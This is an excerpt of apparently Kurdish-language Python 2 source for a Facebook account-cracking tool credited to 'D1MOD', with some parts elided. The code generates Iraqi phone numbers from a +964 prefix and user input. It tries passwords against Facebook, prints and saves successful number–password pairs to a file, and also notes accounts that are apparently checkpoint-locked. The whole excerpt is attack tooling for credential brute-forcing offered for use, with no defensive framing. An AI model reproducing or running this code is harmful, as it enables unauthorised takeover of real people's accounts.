...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m  KURDSTAN   \x1b[1;91m\xe2\x87\x8b  \x1b[1;94m'
    print '[0]\x1b[1;97m  DARCHUN            '
    print '>>\x1b[1;92m TOOL BY D1MOD \x1b[1;91m(\x1b[1;97mV2\x1b[1;91m) '
    print 42 * '\x1b[1;91m='
    action()
...
def action():
    ...
    if bch == '':
        ...
        try:
            c = raw_input('\x1b[1;96mHALBZHERA  : ')
            k = '+964'
            idlist = '.txt'
    ...
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m RAWSTA ')
    time.sleep(0.1)
    psb('')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ABETAWA]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SUTAWA]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
